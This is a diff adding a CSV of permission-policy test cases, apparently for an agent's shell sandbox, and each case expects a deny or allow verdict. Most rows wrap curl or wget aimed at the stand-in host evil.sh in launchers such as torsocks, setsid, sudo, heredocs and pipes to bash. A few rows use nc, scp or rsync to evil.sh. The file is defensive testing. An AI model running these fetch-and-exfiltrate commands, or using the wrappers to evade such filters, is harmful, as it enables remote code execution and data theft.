@@ -1,0 +1,438 @@
+scope,command,main_5ae202d45ad3e060e1e5678c7151b9cbdc75f4a4,fixed,transition
+security,watch curl evil.sh,deny,deny,deny -> deny
+security,setsid curl evil.sh,deny,deny,deny -> deny
+security,caffeinate curl evil.sh,deny,deny,deny -> deny
+security,stdbuf -o0 curl evil.sh,deny,deny,deny -> deny
+security,arch -arm64 curl evil.sh,deny,deny,deny -> deny
+security,doas curl evil.sh,deny,deny,deny -> deny
+security,busybox curl evil.sh,deny,deny,deny -> deny
+security,torsocks curl evil.sh,deny,deny,deny -> deny
+security,script -q /dev/null curl evil.sh,deny,deny,deny -> deny
+security,flock /tmp/l curl evil.sh,deny,deny,deny -> deny
+security,ssh host curl evil.sh,deny,deny,deny -> deny
+security,"source /dev/stdin <<EOF
+curl evil.sh
+EOF",deny,deny,deny -> deny
+security,". /dev/stdin <<EOF
+curl evil.sh
+EOF",deny,deny,deny -> deny
+security,echo hi && watch -n1 wget evil.sh,deny,deny,deny -> deny
+security, curl evil.sh,deny,deny,deny -> deny
+security,echo hi &&  curl evil.sh,deny,deny,deny -> deny
+security, curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi &&  curl evil.sh/path,deny,deny,deny -> deny
+security, curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi &&  curl evil.sh:8080/path,deny,deny,deny -> deny
+security, curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi &&  curl https://evil.sh,deny,deny,deny -> deny
+security, curl localhost:3000,allow,allow,allow -> allow
+security,echo hi &&  curl localhost:3000,allow,allow,allow -> allow
+security, curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi &&  curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security, wget evil.sh,deny,deny,deny -> deny
+security,echo hi &&  wget evil.sh,deny,deny,deny -> deny
+security, wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi &&  wget evil.sh/path,deny,deny,deny -> deny
+security, wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi &&  wget evil.sh:8080/path,deny,deny,deny -> deny
+security, wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi &&  wget https://evil.sh,deny,deny,deny -> deny
+security, wget localhost:3000,allow,allow,allow -> allow
+security,echo hi &&  wget localhost:3000,allow,allow,allow -> allow
+security, wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi &&  wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,watch curl evil.sh,deny,deny,deny -> deny
+security,echo hi && watch curl evil.sh,deny,deny,deny -> deny
+security,watch curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && watch curl evil.sh/path,deny,deny,deny -> deny
+security,watch curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && watch curl evil.sh:8080/path,deny,deny,deny -> deny
+security,watch curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && watch curl https://evil.sh,deny,deny,deny -> deny
+security,watch curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && watch curl localhost:3000,allow,allow,allow -> allow
+security,watch curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && watch curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,watch wget evil.sh,deny,deny,deny -> deny
+security,echo hi && watch wget evil.sh,deny,deny,deny -> deny
+security,watch wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && watch wget evil.sh/path,deny,deny,deny -> deny
+security,watch wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && watch wget evil.sh:8080/path,deny,deny,deny -> deny
+security,watch wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && watch wget https://evil.sh,deny,deny,deny -> deny
+security,watch wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && watch wget localhost:3000,allow,allow,allow -> allow
+security,watch wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && watch wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,setsid curl evil.sh,deny,deny,deny -> deny
+security,echo hi && setsid curl evil.sh,deny,deny,deny -> deny
+security,setsid curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && setsid curl evil.sh/path,deny,deny,deny -> deny
+security,setsid curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && setsid curl evil.sh:8080/path,deny,deny,deny -> deny
+security,setsid curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && setsid curl https://evil.sh,deny,deny,deny -> deny
+security,setsid curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && setsid curl localhost:3000,allow,allow,allow -> allow
+security,setsid curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && setsid curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,setsid wget evil.sh,deny,deny,deny -> deny
+security,echo hi && setsid wget evil.sh,deny,deny,deny -> deny
+security,setsid wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && setsid wget evil.sh/path,deny,deny,deny -> deny
+security,setsid wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && setsid wget evil.sh:8080/path,deny,deny,deny -> deny
+security,setsid wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && setsid wget https://evil.sh,deny,deny,deny -> deny
+security,setsid wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && setsid wget localhost:3000,allow,allow,allow -> allow
+security,setsid wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && setsid wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,caffeinate curl evil.sh,deny,deny,deny -> deny
+security,echo hi && caffeinate curl evil.sh,deny,deny,deny -> deny
+security,caffeinate curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && caffeinate curl evil.sh/path,deny,deny,deny -> deny
+security,caffeinate curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && caffeinate curl evil.sh:8080/path,deny,deny,deny -> deny
+security,caffeinate curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && caffeinate curl https://evil.sh,deny,deny,deny -> deny
+security,caffeinate curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && caffeinate curl localhost:3000,allow,allow,allow -> allow
+security,caffeinate curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && caffeinate curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,caffeinate wget evil.sh,deny,deny,deny -> deny
+security,echo hi && caffeinate wget evil.sh,deny,deny,deny -> deny
+security,caffeinate wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && caffeinate wget evil.sh/path,deny,deny,deny -> deny
+security,caffeinate wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && caffeinate wget evil.sh:8080/path,deny,deny,deny -> deny
+security,caffeinate wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && caffeinate wget https://evil.sh,deny,deny,deny -> deny
+security,caffeinate wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && caffeinate wget localhost:3000,allow,allow,allow -> allow
+security,caffeinate wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && caffeinate wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,stdbuf -o0 curl evil.sh,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 curl evil.sh,deny,deny,deny -> deny
+security,stdbuf -o0 curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 curl evil.sh/path,deny,deny,deny -> deny
+security,stdbuf -o0 curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 curl evil.sh:8080/path,deny,deny,deny -> deny
+security,stdbuf -o0 curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 curl https://evil.sh,deny,deny,deny -> deny
+security,stdbuf -o0 curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && stdbuf -o0 curl localhost:3000,allow,allow,allow -> allow
+security,stdbuf -o0 curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && stdbuf -o0 curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,stdbuf -o0 wget evil.sh,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 wget evil.sh,deny,deny,deny -> deny
+security,stdbuf -o0 wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 wget evil.sh/path,deny,deny,deny -> deny
+security,stdbuf -o0 wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 wget evil.sh:8080/path,deny,deny,deny -> deny
+security,stdbuf -o0 wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && stdbuf -o0 wget https://evil.sh,deny,deny,deny -> deny
+security,stdbuf -o0 wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && stdbuf -o0 wget localhost:3000,allow,allow,allow -> allow
+security,stdbuf -o0 wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && stdbuf -o0 wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,arch -arm64 curl evil.sh,deny,deny,deny -> deny
+security,echo hi && arch -arm64 curl evil.sh,deny,deny,deny -> deny
+security,arch -arm64 curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && arch -arm64 curl evil.sh/path,deny,deny,deny -> deny
+security,arch -arm64 curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && arch -arm64 curl evil.sh:8080/path,deny,deny,deny -> deny
+security,arch -arm64 curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && arch -arm64 curl https://evil.sh,deny,deny,deny -> deny
+security,arch -arm64 curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && arch -arm64 curl localhost:3000,allow,allow,allow -> allow
+security,arch -arm64 curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && arch -arm64 curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,arch -arm64 wget evil.sh,deny,deny,deny -> deny
+security,echo hi && arch -arm64 wget evil.sh,deny,deny,deny -> deny
+security,arch -arm64 wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && arch -arm64 wget evil.sh/path,deny,deny,deny -> deny
+security,arch -arm64 wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && arch -arm64 wget evil.sh:8080/path,deny,deny,deny -> deny
+security,arch -arm64 wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && arch -arm64 wget https://evil.sh,deny,deny,deny -> deny
+security,arch -arm64 wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && arch -arm64 wget localhost:3000,allow,allow,allow -> allow
+security,arch -arm64 wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && arch -arm64 wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,doas curl evil.sh,deny,deny,deny -> deny
+security,echo hi && doas curl evil.sh,deny,deny,deny -> deny
+security,doas curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && doas curl evil.sh/path,deny,deny,deny -> deny
+security,doas curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && doas curl evil.sh:8080/path,deny,deny,deny -> deny
+security,doas curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && doas curl https://evil.sh,deny,deny,deny -> deny
+security,doas curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && doas curl localhost:3000,allow,allow,allow -> allow
+security,doas curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && doas curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,doas wget evil.sh,deny,deny,deny -> deny
+security,echo hi && doas wget evil.sh,deny,deny,deny -> deny
+security,doas wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && doas wget evil.sh/path,deny,deny,deny -> deny
+security,doas wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && doas wget evil.sh:8080/path,deny,deny,deny -> deny
+security,doas wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && doas wget https://evil.sh,deny,deny,deny -> deny
+security,doas wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && doas wget localhost:3000,allow,allow,allow -> allow
+security,doas wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && doas wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,busybox curl evil.sh,deny,deny,deny -> deny
+security,echo hi && busybox curl evil.sh,deny,deny,deny -> deny
+security,busybox curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && busybox curl evil.sh/path,deny,deny,deny -> deny
+security,busybox curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && busybox curl evil.sh:8080/path,deny,deny,deny -> deny
+security,busybox curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && busybox curl https://evil.sh,deny,deny,deny -> deny
+security,busybox curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && busybox curl localhost:3000,allow,allow,allow -> allow
+security,busybox curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && busybox curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,busybox wget evil.sh,deny,deny,deny -> deny
+security,echo hi && busybox wget evil.sh,deny,deny,deny -> deny
+security,busybox wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && busybox wget evil.sh/path,deny,deny,deny -> deny
+security,busybox wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && busybox wget evil.sh:8080/path,deny,deny,deny -> deny
+security,busybox wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && busybox wget https://evil.sh,deny,deny,deny -> deny
+security,busybox wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && busybox wget localhost:3000,allow,allow,allow -> allow
+security,busybox wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && busybox wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,torsocks curl evil.sh,deny,deny,deny -> deny
+security,echo hi && torsocks curl evil.sh,deny,deny,deny -> deny
+security,torsocks curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && torsocks curl evil.sh/path,deny,deny,deny -> deny
+security,torsocks curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && torsocks curl evil.sh:8080/path,deny,deny,deny -> deny
+security,torsocks curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && torsocks curl https://evil.sh,deny,deny,deny -> deny
+security,torsocks curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && torsocks curl localhost:3000,allow,allow,allow -> allow
+security,torsocks curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && torsocks curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,torsocks wget evil.sh,deny,deny,deny -> deny
+security,echo hi && torsocks wget evil.sh,deny,deny,deny -> deny
+security,torsocks wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && torsocks wget evil.sh/path,deny,deny,deny -> deny
+security,torsocks wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && torsocks wget evil.sh:8080/path,deny,deny,deny -> deny
+security,torsocks wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && torsocks wget https://evil.sh,deny,deny,deny -> deny
+security,torsocks wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && torsocks wget localhost:3000,allow,allow,allow -> allow
+security,torsocks wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && torsocks wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,script -q /dev/null curl evil.sh,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null curl evil.sh,deny,deny,deny -> deny
+security,script -q /dev/null curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null curl evil.sh/path,deny,deny,deny -> deny
+security,script -q /dev/null curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null curl evil.sh:8080/path,deny,deny,deny -> deny
+security,script -q /dev/null curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null curl https://evil.sh,deny,deny,deny -> deny
+security,script -q /dev/null curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && script -q /dev/null curl localhost:3000,allow,allow,allow -> allow
+security,script -q /dev/null curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && script -q /dev/null curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,script -q /dev/null wget evil.sh,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null wget evil.sh,deny,deny,deny -> deny
+security,script -q /dev/null wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null wget evil.sh/path,deny,deny,deny -> deny
+security,script -q /dev/null wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null wget evil.sh:8080/path,deny,deny,deny -> deny
+security,script -q /dev/null wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && script -q /dev/null wget https://evil.sh,deny,deny,deny -> deny
+security,script -q /dev/null wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && script -q /dev/null wget localhost:3000,allow,allow,allow -> allow
+security,script -q /dev/null wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && script -q /dev/null wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,flock /tmp/l curl evil.sh,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l curl evil.sh,deny,deny,deny -> deny
+security,flock /tmp/l curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l curl evil.sh/path,deny,deny,deny -> deny
+security,flock /tmp/l curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l curl evil.sh:8080/path,deny,deny,deny -> deny
+security,flock /tmp/l curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l curl https://evil.sh,deny,deny,deny -> deny
+security,flock /tmp/l curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && flock /tmp/l curl localhost:3000,allow,allow,allow -> allow
+security,flock /tmp/l curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && flock /tmp/l curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,flock /tmp/l wget evil.sh,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l wget evil.sh,deny,deny,deny -> deny
+security,flock /tmp/l wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l wget evil.sh/path,deny,deny,deny -> deny
+security,flock /tmp/l wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l wget evil.sh:8080/path,deny,deny,deny -> deny
+security,flock /tmp/l wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && flock /tmp/l wget https://evil.sh,deny,deny,deny -> deny
+security,flock /tmp/l wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && flock /tmp/l wget localhost:3000,allow,allow,allow -> allow
+security,flock /tmp/l wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && flock /tmp/l wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,ssh host curl evil.sh,deny,deny,deny -> deny
+security,echo hi && ssh host curl evil.sh,deny,deny,deny -> deny
+security,ssh host curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && ssh host curl evil.sh/path,deny,deny,deny -> deny
+security,ssh host curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && ssh host curl evil.sh:8080/path,deny,deny,deny -> deny
+security,ssh host curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && ssh host curl https://evil.sh,deny,deny,deny -> deny
+security,ssh host curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && ssh host curl localhost:3000,allow,allow,allow -> allow
+security,ssh host curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && ssh host curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,ssh host wget evil.sh,deny,deny,deny -> deny
+security,echo hi && ssh host wget evil.sh,deny,deny,deny -> deny
+security,ssh host wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && ssh host wget evil.sh/path,deny,deny,deny -> deny
+security,ssh host wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && ssh host wget evil.sh:8080/path,deny,deny,deny -> deny
+security,ssh host wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && ssh host wget https://evil.sh,deny,deny,deny -> deny
+security,ssh host wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && ssh host wget localhost:3000,allow,allow,allow -> allow
+security,ssh host wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && ssh host wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,unlisted-launcher curl evil.sh,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher curl evil.sh,deny,deny,deny -> deny
+security,unlisted-launcher curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher curl evil.sh/path,deny,deny,deny -> deny
+security,unlisted-launcher curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher curl evil.sh:8080/path,deny,deny,deny -> deny
+security,unlisted-launcher curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher curl https://evil.sh,deny,deny,deny -> deny
+security,unlisted-launcher curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && unlisted-launcher curl localhost:3000,allow,allow,allow -> allow
+security,unlisted-launcher curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && unlisted-launcher curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,unlisted-launcher wget evil.sh,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher wget evil.sh,deny,deny,deny -> deny
+security,unlisted-launcher wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher wget evil.sh/path,deny,deny,deny -> deny
+security,unlisted-launcher wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher wget evil.sh:8080/path,deny,deny,deny -> deny
+security,unlisted-launcher wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && unlisted-launcher wget https://evil.sh,deny,deny,deny -> deny
+security,unlisted-launcher wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && unlisted-launcher wget localhost:3000,allow,allow,allow -> allow
+security,unlisted-launcher wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && unlisted-launcher wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,env -i curl evil.sh,deny,deny,deny -> deny
+security,echo hi && env -i curl evil.sh,deny,deny,deny -> deny
+security,env -i curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && env -i curl evil.sh/path,deny,deny,deny -> deny
+security,env -i curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && env -i curl evil.sh:8080/path,deny,deny,deny -> deny
+security,env -i curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && env -i curl https://evil.sh,deny,deny,deny -> deny
+security,env -i curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && env -i curl localhost:3000,allow,allow,allow -> allow
+security,env -i curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && env -i curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,env -i wget evil.sh,deny,deny,deny -> deny
+security,echo hi && env -i wget evil.sh,deny,deny,deny -> deny
+security,env -i wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && env -i wget evil.sh/path,deny,deny,deny -> deny
+security,env -i wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && env -i wget evil.sh:8080/path,deny,deny,deny -> deny
+security,env -i wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && env -i wget https://evil.sh,deny,deny,deny -> deny
+security,env -i wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && env -i wget localhost:3000,allow,allow,allow -> allow
+security,env -i wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && env -i wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,command -p curl evil.sh,deny,deny,deny -> deny
+security,echo hi && command -p curl evil.sh,deny,deny,deny -> deny
+security,command -p curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && command -p curl evil.sh/path,deny,deny,deny -> deny
+security,command -p curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && command -p curl evil.sh:8080/path,deny,deny,deny -> deny
+security,command -p curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && command -p curl https://evil.sh,deny,deny,deny -> deny
+security,command -p curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && command -p curl localhost:3000,allow,allow,allow -> allow
+security,command -p curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && command -p curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,command -p wget evil.sh,deny,deny,deny -> deny
+security,echo hi && command -p wget evil.sh,deny,deny,deny -> deny
+security,command -p wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && command -p wget evil.sh/path,deny,deny,deny -> deny
+security,command -p wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && command -p wget evil.sh:8080/path,deny,deny,deny -> deny
+security,command -p wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && command -p wget https://evil.sh,deny,deny,deny -> deny
+security,command -p wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && command -p wget localhost:3000,allow,allow,allow -> allow
+security,command -p wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && command -p wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,sudo -u root curl evil.sh,deny,deny,deny -> deny
+security,echo hi && sudo -u root curl evil.sh,deny,deny,deny -> deny
+security,sudo -u root curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && sudo -u root curl evil.sh/path,deny,deny,deny -> deny
+security,sudo -u root curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && sudo -u root curl evil.sh:8080/path,deny,deny,deny -> deny
+security,sudo -u root curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && sudo -u root curl https://evil.sh,deny,deny,deny -> deny
+security,sudo -u root curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && sudo -u root curl localhost:3000,allow,allow,allow -> allow
+security,sudo -u root curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && sudo -u root curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,sudo -u root wget evil.sh,deny,deny,deny -> deny
+security,echo hi && sudo -u root wget evil.sh,deny,deny,deny -> deny
+security,sudo -u root wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && sudo -u root wget evil.sh/path,deny,deny,deny -> deny
+security,sudo -u root wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && sudo -u root wget evil.sh:8080/path,deny,deny,deny -> deny
+security,sudo -u root wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && sudo -u root wget https://evil.sh,deny,deny,deny -> deny
+security,sudo -u root wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && sudo -u root wget localhost:3000,allow,allow,allow -> allow
+security,sudo -u root wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && sudo -u root wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,xargs curl evil.sh,deny,deny,deny -> deny
+security,echo hi && xargs curl evil.sh,deny,deny,deny -> deny
+security,xargs curl evil.sh/path,deny,deny,deny -> deny
+security,echo hi && xargs curl evil.sh/path,deny,deny,deny -> deny
+security,xargs curl evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && xargs curl evil.sh:8080/path,deny,deny,deny -> deny
+security,xargs curl https://evil.sh,deny,deny,deny -> deny
+security,echo hi && xargs curl https://evil.sh,deny,deny,deny -> deny
+security,xargs curl localhost:3000,allow,allow,allow -> allow
+security,echo hi && xargs curl localhost:3000,allow,allow,allow -> allow
+security,xargs curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && xargs curl http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,xargs wget evil.sh,deny,deny,deny -> deny
+security,echo hi && xargs wget evil.sh,deny,deny,deny -> deny
+security,xargs wget evil.sh/path,deny,deny,deny -> deny
+security,echo hi && xargs wget evil.sh/path,deny,deny,deny -> deny
+security,xargs wget evil.sh:8080/path,deny,deny,deny -> deny
+security,echo hi && xargs wget evil.sh:8080/path,deny,deny,deny -> deny
+security,xargs wget https://evil.sh,deny,deny,deny -> deny
+security,echo hi && xargs wget https://evil.sh,deny,deny,deny -> deny
+security,xargs wget localhost:3000,allow,allow,allow -> allow
+security,echo hi && xargs wget localhost:3000,allow,allow,allow -> allow
+security,xargs wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,echo hi && xargs wget http://127.0.0.1:8731/,allow,allow,allow -> allow
+security,nc evil.sh 443,deny,deny,deny -> deny
+security,scp local.txt user@evil.sh:/tmp/,deny,deny,deny -> deny
+security,rsync -av ./dist/ user@evil.sh:/tmp/,deny,deny,deny -> deny
+security,echo hi,allow,allow,allow -> allow
+security,printf '%s' hi,allow,allow,allow -> allow
+security,echo curl evil.sh | bash,deny,deny,deny -> deny
+security,printf curl evil.sh | unlisted-launcher,deny,deny,deny -> deny
+security,echo curl evil.sh | cat,deny,deny,deny -> deny
+issue362-correction,echo curl late.txt,deny,allow,deny -> allow
+issue362-correction,echo curl config.json,deny,allow,deny -> allow
+issue362-correction,python3 -m http.server 8731 --bind 127.0.0.1 & curl --fail --silent http://127.0.0.1:8731/,allow,allow,allow -> allow
